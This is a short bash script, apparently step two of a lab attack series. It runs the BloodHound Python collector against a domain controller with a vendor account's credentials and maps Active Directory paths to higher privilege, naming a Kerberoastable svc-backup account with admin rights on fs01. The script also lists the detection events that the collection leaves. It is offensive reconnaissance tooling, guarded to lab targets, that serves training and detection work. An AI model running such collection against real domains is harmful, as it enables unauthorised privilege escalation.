#!/usr/bin/env bash
# Step 2: Collect AD relationships to find a path to higher privilege.
source "$(dirname "$0")/00-config.sh"
assert_lab_target "$DC_IP"

banner "02 BLOODHOUND - attack path discovery"
atk "T1482 Domain Trust Discovery | T1069.002 Permission Groups Discovery"

cd "$LOOT"
echo "[*] Running the BloodHound Python collector (LDAP + SMB)..."
bloodhound-python -u "$VENDOR_USER" -p "$VENDOR_PASS" -d "$DOMAIN" -ns "$DC_IP" -c All --zip

echo "[+] Collection zip written to $LOOT."
echo "    Import it into BloodHound CE (docker compose up) and run the query:"
echo "    'Find Kerberoastable accounts' -> you should see svc-backup,"
echo "    and 'svc-backup -> AdminTo -> fs01'."
expect "LDAP queries + 4624s from the attacker IP; SharpHound would also show 4662."
